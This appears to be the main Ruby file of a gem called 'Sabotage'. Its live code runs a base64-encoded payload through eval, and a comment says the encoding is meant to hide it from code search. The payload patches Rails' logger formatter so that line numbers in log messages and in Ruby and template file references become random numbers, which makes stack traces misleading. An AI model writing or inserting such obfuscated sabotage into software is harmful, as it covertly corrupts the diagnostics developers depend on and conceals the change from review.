require "sabotage/railtie"

module Sabotage
end

# code = %q{
#   class String
#     def to_random_number
#       rand(self.match(/\d+/)[0].to_i * 2) + 1
#     end
#   end
#   module ActiveSupport
#     class Logger < ::Logger
#       class SimpleFormatter < ::Logger::Formatter
#         def call(severity, timestamp, progname, msg)
#           str = "#{String === msg ? msg : msg.inspect}\n"
#           str.gsub!(/\d+\]/) { |e| e.to_random_number }
#           ['rb', 'slim', 'haml', 'erb', 'jbuilder'].each do |ee|
#             str.gsub!(/\.#{ee}:\d+/)   { |e| ".#{ee}:#{e.to_random_number}" }
#           end
#           str
#         end
#       end
#     end
#   end
# }
# # encode code into base64 to hide it from regular code search
# puts Base64.encode64(code)

# is the same as above
eval(Base64.decode64(%{CiAgY2xhc3MgU3RyaW5nCiAgICBkZWYgdG9fcmFuZG9tX251bWJlcgogICAg
ICByYW5kKHNlbGYubWF0Y2goL1xkKy8pWzBdLnRvX2kgKiAyKSArIDEKICAg
IGVuZAogIGVuZAogIG1vZHVsZSBBY3RpdmVTdXBwb3J0CiAgICBjbGFzcyBM
b2dnZXIgPCA6OkxvZ2dlcgogICAgICBjbGFzcyBTaW1wbGVGb3JtYXR0ZXIg
PCA6OkxvZ2dlcjo6Rm9ybWF0dGVyCiAgICAgICAgZGVmIGNhbGwoc2V2ZXJp
dHksIHRpbWVzdGFtcCwgcHJvZ25hbWUsIG1zZykKICAgICAgICAgIHN0ciA9
ICIje1N0cmluZyA9PT0gbXNnID8gbXNnIDogbXNnLmluc3BlY3R9XG4iCiAg
ICAgICAgICBzdHIuZ3N1YiEoL1xkK1xdLykgeyB8ZXwgZS50b19yYW5kb21f
bnVtYmVyIH0KICAgICAgICAgIFsncmInLCAnc2xpbScsICdoYW1sJywgJ2Vy
YicsICdqYnVpbGRlciddLmVhY2ggZG8gfGVlfAogICAgICAgICAgICBzdHIu
Z3N1YiEoL1wuI3tlZX06XGQrLykgICB7IHxlfCAiLiN7ZWV9OiN7ZS50b19y
YW5kb21fbnVtYmVyfSIgfQogICAgICAgICAgZW5kCiAgICAgICAgICBzdHIK
ICAgICAgICBlbmQKICAgICAgZW5kCiAgICBlbmQKICBlbmQK}))